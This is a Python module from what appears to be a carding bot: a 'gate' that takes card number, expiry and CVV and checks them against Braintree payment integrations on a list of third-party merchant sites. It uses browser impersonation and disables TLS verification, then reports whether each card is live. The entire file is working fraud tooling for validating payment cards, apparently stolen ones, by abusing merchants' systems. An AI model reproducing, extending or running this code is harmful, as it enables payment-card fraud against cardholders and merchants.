# language: Python 3.12+, file: bot/gates/braintreenvbv.py, target: Windows 11
# Фаза 5: Braintree VBV lookup gate ($0 токенизация, вердикт по cvvResponseCode).
import asyncio
import os
import sys
from pathlib import Path

import gate_client as gc
from curl_cffi.requests import AsyncSession

NAME = "braintreenvbv"
COST = 1

_lock = asyncio.Lock()


def _targets() -> list[str]:
    t = os.environ.get("PUSTO_BT_TARGETS", "")
    if t:
        return [x.strip().rstrip("/") for x in t.split(",") if x.strip()]
    p = Path(__file__).resolve().parents[2] / "data" / "braintree_targets.txt"
    if p.exists():
        return [ln.strip().rstrip("/") for ln in
                p.read_text(encoding="utf-8").splitlines() if ln.strip().startswith("http")]
    return []


def _normalize(cc, mm, yy, cvv) -> str | None:
    cc = "".join(ch for ch in str(cc) if ch.isdigit())
    if not gc.check_luhn(cc):
        return None
    year = str(yy).strip()
    if len(year) == 2:
        year = "20" + year
    return f"{cc}|{str(mm).strip().zfill(2)}|{year}|{str(cvv).strip()}"


async def gate(cc, mm, yy, cvv) -> tuple[str, str]:
    raw = _normalize(cc, mm, yy, cvv)
    if raw is None:
        return ("INVALID", "bad card format / Luhn fail")
    targets = _targets()
    if not targets:
        return ("ERROR", "no braintree targets (env PUSTO_BT_TARGETS)")
    async with _lock:
        for target in targets:
            try:
                async with AsyncSession(impersonate="chrome131", verify=False) as s:
                    r = await s.get(target, timeout=10)
                    res = await gc.braintree_vbv_check(s, r.text, raw, target)
            except Exception as e:
                res = {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:150]}
            if res["status"] != "ERROR":
                return (res["status"], res["detail"])
        return ("ERROR", f"all {len(targets)} targets failed")
